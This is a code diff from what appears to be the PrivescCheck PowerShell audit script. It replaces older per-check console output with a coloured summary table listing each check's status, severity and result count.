+    | OK | None | HARDENING > BitLocker                                           |
+    | NA | Info | SERVICES > Non-default Services -> 41 result(s)                 |
+    | NA | Info | SERVICES > Hijackable DLLs -> 2 result(s)                       |
+    | OK | None | SERVICES > System's %PATH%                                      |
+    | OK | None | SERVICES > Unquoted Paths                                       |
+    | OK | None | SERVICES > Binary Permissions                                   |
+    | OK | None | SERVICES > Permissions - SCM                                    |
+    | OK | None | SERVICES > Permissions - Registry                               |
+    | OK | None | UPDATES > System up to date?                                    |
+    | OK | None | USER > Privileges                                               |
+    | NA | Info | USER > Environment Variables                                    |
+    +----+------+-----------------------------------------------------------------+
+
+    #>
+
+    [CmdletBinding()] param(
+        
+    )
+
+    Write-Host "+-----------------------------------------------------------------------------+"
+    Write-Host "|                         ~~~ PrivescCheck Report ~~~                         |"
+    Write-Host "+----+------+-----------------------------------------------------------------+"
+
+    $ResultArrayList | Sort-Object -Property Category | ForEach-Object {
+
+        Write-Host -NoNewline "| "
+        if ($_.Type -Like "vuln") {
+            if ($_.ResultRaw) {
+                Write-Host -NoNewline -ForegroundColor "Red" "KO"
+            } else {
+                Write-Host -NoNewline -ForegroundColor "Green" "OK"
+            }
+        } else {
+            Write-Host -NoNewline -ForegroundColor "DarkGray" "NA"
+        }
+        Write-Host -NoNewline " | "
+
+        if ($_.Severity -Like "None") {
+            $SeverityColor = "DarkGray"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor "None"
+        } elseif ($_.Severity -Like "Low") {
+            $SeverityColor = "DarkGreen"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor "Low "
+        } elseif ($_.Severity -Like "Medium") {
+            $SeverityColor = "DarkYellow"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor "Med."
+        } elseif ($_.Severity -Like "High") {
+            $SeverityColor = "DarkRed"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor "High"
+        } elseif ($_.Severity -Like "Info") {
+            $SeverityColor = "DarkBlue"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor "Info"
+        } else {
+            $SeverityColor = "White"
+            Write-Host -NoNewline "    "
+        }
+        Write-Host -NoNewline " |"
+
+        $Message = "$($_.Category.ToUpper()) > $($_.DisplayName)"
+        if ($_.ResultRaw) {
+            $Message = "$($Message) -> $(([object[]]$_.ResultRaw).Length) result(s)"
+        }
+        $Padding = ' ' * $(63 - $Message.Length)
+
+        Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
+        
+        if ($_.ResultRaw) {
+            Write-Host -NoNewLine " ->"
+            Write-Host -NoNewLine -ForegroundColor $SeverityColor " $(([object[]]$_.ResultRaw).Length) result(s)"
+        }
+        
+        Write-Host "$($Padding) |"
     }
 
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "Machine Role" -Type Info -Note "Is it a Workstation / Server / Domain Controller?"
-    $Results = Invoke-MachineRoleCheck 
-    if ($Results) {
-        "[*] Found some info."
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found"
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "System Startup History" -Type Info -Note "Can we extract the startup history from the Event Log?"
-    $Results = Invoke-SystemStartupHistoryCheck
-    if (([object[]]$Results).Length -gt 0) {
-        "[*] Found $(([object[]]$Results).Length) startup event(s) in the last 31 days."
-        "[*] Last startup time was: $(([object[]]$Results)[0].Time)"
-        $Results | Select-Object -First 10 | Format-Table
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "Last System Startup" -Type Info -Note "Can we calculate the last system startup date based on the current tick count? /!\ This might be unreliable."
-    $Results = Invoke-SystemStartupCheck
-    if ($Results) {
-        "[*] Last startup event time:"
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
-    }
-
-    "`r`n"
-
-    Write-Banner -Category "Misc" -Name "Filesystem Drives" -Type Info -Note "Is there any other partition or mapped share?"
-    $Results = Invoke-SystemDrivesCheck
-    "[*] Found $(([object[]]$Results).Length) drive(s)."
-    $Results | Format-Table -AutoSize
-
-    "`r`n"
+    Write-Host "+----+------+-----------------------------------------------------------------+"
 }
 #endregion Main
